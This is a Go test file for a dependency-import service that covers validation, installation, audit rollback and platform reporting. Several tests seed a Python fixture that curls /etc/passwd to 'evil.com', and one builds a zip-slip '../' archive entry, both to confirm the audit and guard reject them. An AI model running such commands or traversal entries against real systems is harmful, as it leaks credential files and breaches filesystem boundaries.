package controller

import (
	"archive/tar"
	"compress/gzip"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"testing"
	"time"

	"taa/internal/codeaudit"
)

func TestImportDepsRejectsEmptyResourceURL(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "",
		"requestId":   "req-1",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsMissingTaskAndRequestID(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/deps.tar.gz",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsNonPost(t *testing.T) {
	_, server := setupTestServer(t)

	resp, err := http.Get(server.URL + "/v1/taa/importDeps")
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want 405", resp.StatusCode)
	}
}

// waitForDepsSlotRelease polls until the task slot taken by importDeps is fully released.
// Both fields are checked because release() clears them together under a single lock hold; a
// leaked slot (a dropped release() call) leaves CurrentOp pinned at "deps_importing" and would
// otherwise turn every later import into a permanent 409 with no test noticing.
// It does not reuse waitForIdle, which only inspects CurrentOp.
func waitForDepsSlotRelease(t *testing.T, state *TAAState) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		state.mu.RLock()
		released := state.CurrentOp == "idle" && state.ActiveTaskID == ""
		state.mu.RUnlock()
		if released {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("timed out waiting for the importDeps task slot to be released")
}

// TestImportDepsDownloadFailureReleasesTaskSlot covers the one synchronous path the other tests
// skip: the request passes parameter validation and acquires the task slot, then the download
// fails. The handler must answer 500 and still hand the slot back.
func TestImportDepsDownloadFailureReleasesTaskSlot(t *testing.T) {
	state, server := setupTestServer(t)

	// Loopback is exempt from ProxyFromEnvironment and port 1 refuses immediately, so the
	// download fails at once with an error carrying no pkgerrors code, giving the handler's
	// 500 branch.
	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/deps.tar.gz",
		"requestId":   "req-download-failure",
	})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500 (msg=%q)", resp.StatusCode, api.Msg)
	}

	waitForDepsSlotRelease(t, state)
}

// TestImportDepsSuccessReleasesTaskSlot covers the happy path end to end against a local file
// server: 200, the expected message, and the slot released afterwards.
func TestImportDepsSuccessReleasesTaskSlot(t *testing.T) {
	state, server := setupTestServer(t)

	archive := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("fake wheelhouse bytes"))
	}))
	t.Cleanup(archive.Close)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": archive.URL + "/deps.tar.gz",
		"requestId":   "req-success",
	})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (msg=%q)", resp.StatusCode, api.Msg)
	}
	if api.Msg != "依赖包已接收，处理中" {
		t.Fatalf("msg = %q, want %q", api.Msg, "依赖包已接收，处理中")
	}

	// The envelope is written before runAsyncSafe launches the goroutine, so the slot may
	// still be held here; poll rather than assert immediately.
	waitForDepsSlotRelease(t, state)
}

// TestProcessImportedDepsInstallsAndRecords drives the pipeline against a stub installer: the
// decrypted plaintext archive is validated, "installed" into DEPS_DIR/<sm3>, the state fields
// are set, and the audit marker reaches disk.
//
// Security.ScanEnabled=false makes auditAndReportDeps take the existing short-circuit and pass,
// so no audit hook has to be substituted -- the same technique the model-import tests use.
func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	var installedTarget string
	depsInstallFunc = func(wheelhouse, target string) error {
		installedTarget = target
		return os.MkdirAll(target, 0o755)
	}

	archive := buildTestDepsArchive(t)

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-d", TaskID: "task-d"}
	state.processImportedDeps(req, 1, archive)

	if !state.DepsImported {
		t.Fatal("DepsImported = false after a successful pipeline run")
	}
	if installedTarget != state.currentDepsDir() {
		t.Fatalf("install target = %q, want %q", installedTarget, state.currentDepsDir())
	}
	if _, err := os.Stat(filepath.Join(installedTarget, depsAuditMarker)); err != nil {
		t.Fatalf("audit marker missing: %v", err)
	}
}

// TestProcessImportedDepsSkipsWhenAlreadyAudited verifies idempotency: when the same hash is
// already marked, the installer must not be called again.
func TestProcessImportedDepsSkipsWhenAlreadyAudited(t *testing.T) {
	state, _ := setupTestState(t)

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	calls := 0
	depsInstallFunc = func(wheelhouse, target string) error {
		calls++
		return os.MkdirAll(target, 0o755)
	}

	archive := buildTestDepsArchive(t)
	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-i", TaskID: "task-i"}

	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	state.clearDepsState()
	state.processImportedDeps(req, 1, archive)

	if calls != 1 {
		t.Fatalf("installer called %d times, want 1 (second run must reuse the audited dir)", calls)
	}
}

// TestProcessImportedDepsRejectsArchiveWithoutWheel verifies that archive content validation
// happens inside the asynchronous pipeline.
func TestProcessImportedDepsRejectsArchiveWithoutWheel(t *testing.T) {
	state, _ := setupTestState(t)

	// The installer is stubbed to succeed so that ValidateWheelhouse is the only thing left
	// that can reject this archive. With the real installer a wheel-less wheelhouse also fails
	// at pip (no candidates under --no-index), and that independent failure would keep this
	// test green even if the content check were deleted -- it would then assert nothing.
	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	archive := buildTestArchive(t, map[string]string{"requirements.txt": "torch\n"})
	req := depsImportRequest{ResourceURL: "http://x/bad.tar.gz", RequestID: "req-b", TaskID: "task-b"}

	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive without any .whl")
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsRejectsZipSlip verifies that a malicious archive's `../` entry is
// rejected and that nothing is written outside the wheelhouse.
//
// The traversal is deliberately only ONE level deep. That still leaves the unpack directory
// (whose parent is the deps root, see processImportedDeps), it just leaves it into a path the
// test can still observe. A deeper traversal such as "../../../../../../../../pwned" escapes
// all the way to "/pwned", where it is refused by the kernel (EACCES for a non-root runner)
// instead of by the guard under test: the extraction fails, the pipeline fails closed, and the
// test passes even with the guard deleted -- it would prove nothing. Keep the depth shallow:
// the escape target has to stay inside the test's own tree for the test to be discriminating.
func TestProcessImportedDepsRejectsZipSlip(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	// The escape target lives in the deps root, one level above the temp unpack dir, so a
	// guard that lets it through leaves a file the assertions below can see.
	escaped := filepath.Join(state.Security.GetDepsDir(), "pwned")
	archive := buildTestArchive(t, map[string]string{
		"requirements.txt":             "torch\n",
		"a-1.0-py3-none-any.whl":       "x",
		"../" + filepath.Base(escaped): "pwned",
	})

	req := depsImportRequest{ResourceURL: "http://x/evil.tar.gz", RequestID: "req-z", TaskID: "task-z"}
	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive with a path-traversal entry")
	}
	if _, err := os.Stat(escaped); !os.IsNotExist(err) {
		t.Fatalf("zip-slip escaped the wheelhouse: %s exists", escaped)
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsInstallFailureKeepsWorkingBinding covers the failure semantics spec 6
// correction 2 stresses most: a newcomer whose install fails must not unseat the dependency set
// that is already bound and working.
func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-a", TaskID: "task-a"}, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}
	boundHash, boundDir := state.DepsHash, state.currentDepsDir()

	// The stub mirrors the real installer's documented contract -- it creates the target
	// before running pip, so a failure leaves the target partially populated -- which is
	// exactly why the pipeline, not pip, has to own the cleanup.
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return errors.New("pip exploded")
	}
	// The second archive must differ byte-for-byte from the first: an identical one hashes to
	// the same SM3 and therefore the same directory, and the idempotence check would short
	// circuit before the install branch this test exists to cover.
	other := buildTestArchive(t, map[string]string{
		"requirements.txt":            "torch\n",
		"second-1.0-py3-none-any.whl": "y",
	})
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/b.tar.gz", RequestID: "req-b", TaskID: "task-b"}, 1, other)

	if !state.DepsImported || state.DepsHash != boundHash {
		t.Fatalf("binding changed after a failed newcomer: DepsImported=%v DepsHash=%q want %q",
			state.DepsImported, state.DepsHash, boundHash)
	}
	if _, err := os.Stat(filepath.Join(boundDir, depsAuditMarker)); err != nil {
		t.Fatalf("bound directory lost its audit marker: %v", err)
	}
	assertDepsRootContainsOnly(t, state, filepath.Base(boundDir))
}

// TestProcessImportedDepsKeepsBindingWhenNewAuditFails is the same requirement on the audit
// path: the newcomer is installed, the real audit rejects it, and the rollback must leave the
// working binding untouched.
//
// The installer stub writes a source file the rule engine matches, so the audit genuinely
// fails. An empty target would match no rule, the audit would pass, the pipeline would rebind,
// and this test would be asserting the opposite of what it claims.
func TestProcessImportedDepsKeepsBindingWhenNewAuditFails(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false
	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
	// probe a service this test does not stand up.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	// The first import runs with scanning off, so the matching file it writes is inert; the
	// second turns scanning on and that same file becomes the reason the audit fails.
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
	}
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-a2", TaskID: "task-a2"}, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}
	boundHash, boundDir := state.DepsHash, state.currentDepsDir()

	state.Security.ScanEnabled = true
	other := buildTestArchive(t, map[string]string{
		"requirements.txt":           "torch\n",
		"third-1.0-py3-none-any.whl": "z",
	})
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/c.tar.gz", RequestID: "req-c", TaskID: "task-c"}, 1, other)

	if !state.DepsImported || state.DepsHash != boundHash {
		t.Fatalf("a failed audit unseated the working binding: DepsImported=%v DepsHash=%q want %q",
			state.DepsImported, state.DepsHash, boundHash)
	}
	assertDepsRootContainsOnly(t, state, filepath.Base(boundDir))
}

// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone covers the mirror
// case. Deleting the marker makes the idempotence check miss, so the pipeline re-runs over the
// directory that is currently bound, destroys it, and then fails to rebuild it. The binding
// must not survive its own directory -- a bit pointing at a missing directory is the same
// silent degradation with the two halves swapped.
func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }
	req := depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-d", TaskID: "task-d"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}

	if err := os.Remove(filepath.Join(state.currentDepsDir(), depsAuditMarker)); err != nil {
		t.Fatalf("remove audit marker: %v", err)
	}
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return errors.New("pip exploded")
	}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	if state.DepsImported || state.DepsHash != "" {
		t.Fatalf("binding outlived its directory: DepsImported=%v DepsHash=%q", state.DepsImported, state.DepsHash)
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsReportsFailureCodeToPlatform is the fail-closed rollback contract of
// spec 12 end to end. Its three clauses are all asserted in one place: the state flag is
// cleared, the content-addressed directory is gone, and the platform actually receives the
// failure (code=1) on the reportDeps channel. The last clause used to have no coverage at all:
// reportDepsAsync was a log-only stub, so nothing joined "the pipeline failed" to "the platform
// was told", and the platform saw the task hang rather than fail.
//
// The installer stub writes a source file the rule engine matches, not merely a directory.
// That is load-bearing: an empty directory would match no rule, the audit would pass, the
// pipeline would succeed, the platform would receive code=0, and this test would be asserting
// the opposite of what it claims.
func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
	// probe a service this test does not stand up.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
	}

	got := make(chan map[string]any, 1)
	platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Capture only the terminal dependency-import callback this test asserts on. The
		// dependency audit posts its own report (scope=deps) to this same platform address from a
		// separate goroutine, and that report may arrive first; if it took the single channel
		// slot the path assertion below would fail spuriously. Any other path is answered
		// normally and dropped, and is never decoded or captured.
		if r.URL.Path != reportDepsEndpoint {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
			return
		}
		var body map[string]any
		_ = json.NewDecoder(r.Body).Decode(&body)
		body["__path"] = r.URL.Path
		select {
		case got <- body:
		default:
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	t.Cleanup(platformServer.Close)

	state.mu.Lock()
	state.PlatformIP, state.DockerID = platformServer.URL, "docker-test"
	state.mu.Unlock()

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-p", TaskID: "task-p"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	// Clauses one and two: TAA's own state after the rollback.
	if state.DepsImported {
		t.Fatal("DepsImported = true after a rejected dependency set")
	}
	if dir := state.currentDepsDir(); dir != "" {
		t.Fatalf("currentDepsDir() = %q, want empty after rollback", dir)
	}
	assertDepsRootEmpty(t, state)

	// Clause three: the platform is told. Wait with a timeout so an un-sent callback surfaces
	// as a failure with a diagnosis rather than a hung test.
	select {
	case body := <-got:
		if body["__path"] != reportDepsEndpoint {
			t.Fatalf("report path = %v, want %q -- a failed dependency import must use the deps callback", body["__path"], reportDepsEndpoint)
		}
		if code, ok := body["code"].(float64); !ok || int(code) != 1 {
			t.Fatalf("code = %v, want 1", body["code"])
		}
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for the reportDeps callback: the platform never learned the import failed")
	}
}

// TestAuditMarkerVersionGate pins the content of the audit marker: only the current policy
// version is trusted, so a marker written by another policy (or by hand) cannot short-circuit
// the pipeline.
func TestAuditMarkerVersionGate(t *testing.T) {
	dir := t.TempDir()
	if auditMarkerExists(dir) {
		t.Fatal("absent marker must not be trusted")
	}
	if err := os.WriteFile(filepath.Join(dir, depsAuditMarker), []byte("audited\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if auditMarkerExists(dir) {
		t.Fatal("foreign-content marker must not be trusted")
	}
	if err := writeAuditMarker(dir); err != nil {
		t.Fatal(err)
	}
	if !auditMarkerExists(dir) {
		t.Fatal("fresh marker must be trusted")
	}
}

// TestProcessImportedDepsReauditsForeignMarkerDir verifies the version gate end to end: a
// dependency directory that carries a marker whose content is not the current policy's must be
// rebuilt rather than reused.
//
// Security.ScanEnabled=false is deliberate here: it lets the pipeline reach the marker write
// (see auditAndReportDeps), which is what gives the test a real marker to overwrite with a
// foreign one.
func TestProcessImportedDepsReauditsForeignMarkerDir(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	calls := 0
	depsInstallFunc = func(wheelhouse, target string) error {
		calls++
		return os.MkdirAll(target, 0o755)
	}

	req := depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-f", TaskID: "task-f"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	if calls != 1 {
		t.Fatalf("setup: installer calls=%d, want 1", calls)
	}
	if err := os.WriteFile(filepath.Join(state.currentDepsDir(), depsAuditMarker), []byte("audited\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	// The archive must be rebuilt: processImportedDeps removes the ciphertext path it is given,
	// so reusing the same file would fail before reaching the installer.
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	if calls != 2 {
		t.Fatalf("installer called %d times, want 2: a foreign marker must not short-circuit", calls)
	}
}

// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup and the scope=deps report
// together. It drives the real engine (the regex baseline setupTestState installs) exactly as
// TestAuditAndReportModelImportStaticFail does for the model path, so the assertion covers the
// engine call, the JSON projection and the report as one unit. It asserts nothing about the
// binding: that is rollbackDepsImport's job and is covered by the pipeline tests.
func TestRunDepsAuditRemovesDirOnFailure(t *testing.T) {
	state, _ := setupTestState(t)
	// No ScanEnabled here: the scanning gate lives in the caller, auditAndReportDeps
	// (deps_import.go), and this test calls runDepsAudit directly, which never reads it.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	received := make(chan struct {
		Code  int    `json:"code"`
		Scope string `json:"scope"`
	}, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr struct {
			Code  int    `json:"code"`
			Scope string `json:"scope"`
		}
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()
	state.mu.Lock()
	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
	state.mu.Unlock()

	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatalf("seed dir: %v", err)
	}
	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(code), 0o644); err != nil {
		t.Fatalf("seed file: %v", err)
	}

	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-1", TaskID: "task-1"}, depsDir); passed {
		t.Fatal("runDepsAudit returned true for a failing audit")
	}
	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
		t.Fatalf("deps dir still present after a failed audit: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
		}
		if rr.Scope != "deps" {
			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the scope=deps audit report")
	}
}

// auditReportCapture is the projection the two branch tests below assert on: the audit report's
// code and scope. Those two fields are what tell a fail-closed rejection (code=2, scope=deps)
// apart from an ordinary audit verdict, so both are read from the wire rather than from state.
type auditReportCapture struct {
	Code  int    `json:"code"`
	Scope string `json:"scope"`
}

// captureAuditReport points state at a platform stub that captures the code and scope of every
// /v1/taa/reportAudit request and returns the channel they arrive on. Any other path is answered
// normally and dropped, so the scope=deps report the caller asserts on holds the single channel
// slot. PlatformIP and DockerID are written under the lock because reportAuditScopedAsync reads
// them under the same lock.
func captureAuditReport(t *testing.T, state *TAAState) <-chan auditReportCapture {
	t.Helper()
	received := make(chan auditReportCapture, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			w.WriteHeader(http.StatusOK)
			return
		}
		var rr auditReportCapture
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(platform.Close)

	state.mu.Lock()
	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
	state.mu.Unlock()
	return received
}

// seedCleanDepsDir creates DEPS_DIR/<name> holding one source file that matches no rule of the
// baseline engine, and returns the directory path.
//
// The content is deliberately inert. A rule-matching file would weaken both branch tests below:
// a mutation that stopped the branch under test from rejecting the set would still let the
// ordinary audit-failure path delete the directory, so the "directory removed" assertion would
// hold for the wrong reason instead of pinning that branch. With clean content, removal plus
// code=2 are observable only if the branch under test actually ran.
func seedCleanDepsDir(t *testing.T, state *TAAState, name string) string {
	t.Helper()
	depsDir := filepath.Join(state.Security.GetDepsDir(), name)
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatalf("seed dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte("import os\n"), 0o644); err != nil {
		t.Fatalf("seed file: %v", err)
	}
	return depsDir
}

// TestRunDepsAuditLLMUnavailableFailsClosed pins the LLM-unavailable branch of runDepsAudit
// (deps_audit.go): with the LLM enabled and fail-closed, an unreachable service must reject the
// dependency set outright rather than silently degrading to a static-only scan that lets it
// through, and the rejection must carry code=2 with scope=deps.
//
// The branch is decided before GenerateAuditReport is reached, so the engine is left at the
// fixture default on purpose: it cannot influence this outcome, and setting it would only suggest
// it could.
func TestRunDepsAuditLLMUnavailableFailsClosed(t *testing.T) {
	state, _ := setupTestState(t)

	// A server closed before use refuses connections immediately, so the fail-closed health probe
	// returns without waiting out its budget.
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	llmDown.Close()
	state.Security.LLM = codeaudit.LLMConfig{
		Enabled:    true,
		FailClosed: true,
		Endpoint:   llmDown.URL,
		Model:      "qwen2.5-coder:0.5b",
	}

	depsDir := seedCleanDepsDir(t, state, "llm-unavailable")
	received := captureAuditReport(t, state)

	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-llm", TaskID: "task-llm"}, depsDir); passed {
		t.Fatal("runDepsAudit returned true while the LLM was unavailable and fail-closed")
	}
	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
		t.Fatalf("deps dir still present after a fail-closed LLM unavailability: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (LLM unavailable, fail-closed)", rr.Code)
		}
		if rr.Scope != "deps" {
			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the scope=deps audit report (LLM-unavailable branch)")
	}
}

// TestRunDepsAuditEngineErrorFailsClosed pins the engine-error branch of runDepsAudit
// (deps_audit.go): a nil engine is a configuration the audit refuses, and that refusal must be
// cleaned up and reported exactly like an LLM failure -- code=2 with scope=deps.
//
// GenerateAuditReport returns "static engine is not configured" for a nil engine rather than
// dereferencing it (internal/codeaudit/verifier.go), so this reaches the error branch instead of
// panicking.
func TestRunDepsAuditEngineErrorFailsClosed(t *testing.T) {
	state, _ := setupTestState(t)
	// Keep the LLM out of the way: with it disabled the engine is the only thing left that can
	// fail, which is what makes this test drive the engine-error branch rather than the one above.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = nil

	depsDir := seedCleanDepsDir(t, state, "engine-missing")
	received := captureAuditReport(t, state)

	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-eng", TaskID: "task-eng"}, depsDir); passed {
		t.Fatal("runDepsAudit returned true with no static engine configured")
	}
	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
		t.Fatalf("deps dir still present after a missing-engine audit failure: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (engine error, fail-closed)", rr.Code)
		}
		if rr.Scope != "deps" {
			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the scope=deps audit report (engine-error branch)")
	}
}

// rollbackDepsImport's own two branches are NOT unit-tested here: Task 6's pipeline tests reach
// both through real call sites -- TestProcessImportedDepsInstallFailureKeepsWorkingBinding (a
// non-bound directory is removed, the working binding is kept) and
// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone (the bound directory
// is removed, so the binding is cleared). Asserting the same invariant a second time at the unit
// level would only add another place to forget to update.

// ── test helpers ─────────────────────────────────────────

// buildTestDepsArchive builds a minimal valid dependency package: requirements.txt plus one
// empty .whl.
func buildTestDepsArchive(t *testing.T) string {
	t.Helper()
	return buildTestArchive(t, map[string]string{
		"requirements.txt":                    "torchvision==0.28.0\n",
		"torchvision-0.28.0-py3-none-any.whl": "not-a-real-wheel\n",
	})
}

// buildTestArchive packs name->content into a tar.gz on disk and returns the file path.
func buildTestArchive(t *testing.T, files map[string]string) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "deps.tar.gz")
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create archive: %v", err)
	}
	defer f.Close()

	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)

	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names) // stable write order, so failures reproduce

	for _, name := range names {
		content := files[name]
		hdr := &tar.Header{
			Name:     name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("write header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write body %s: %v", name, err)
		}
	}

	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return path
}

// assertDepsRootEmpty asserts that no leftover directory remains under the content-addressed root.
func assertDepsRootEmpty(t *testing.T, state *TAAState) {
	t.Helper()
	entries, err := os.ReadDir(state.Security.GetDepsDir())
	if err != nil {
		t.Fatalf("read deps root: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("deps root is not empty, %d leftover entries: %v", len(entries), entries)
	}
}

// assertDepsRootContainsOnly fails unless the deps root holds exactly one entry with the
// given base name. Asserting what remains -- rather than that nothing errored -- is what
// makes the "a failing newcomer must not unseat the working set" tests discriminating.
func assertDepsRootContainsOnly(t *testing.T, state *TAAState, wantName string) {
	t.Helper()
	entries, err := os.ReadDir(state.Security.GetDepsDir())
	if err != nil {
		t.Fatalf("read deps root: %v", err)
	}
	names := make([]string, 0, len(entries))
	for _, e := range entries {
		names = append(names, e.Name())
	}
	if len(names) != 1 || names[0] != wantName {
		t.Fatalf("deps root holds %v, want exactly [%s]", names, wantName)
	}
}

func TestStatusReportsDepsState(t *testing.T) {
	state, server := setupTestServer(t)
	state.saveDepsSuccess("cafebabe", map[string]any{"size": int64(5), "algorithm": "sm3", "value": "cafebabe"})

	resp := postJSON(t, server.URL+"/v1/taa/status", map[string]any{})
	defer resp.Body.Close()

	var body struct {
		Result map[string]any `json:"result"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.Result["depsImported"] != true {
		t.Fatalf("depsImported = %v, want true", body.Result["depsImported"])
	}
	if body.Result["depsHash"] != "cafebabe" {
		t.Fatalf("depsHash = %v, want cafebabe", body.Result["depsHash"])
	}
}
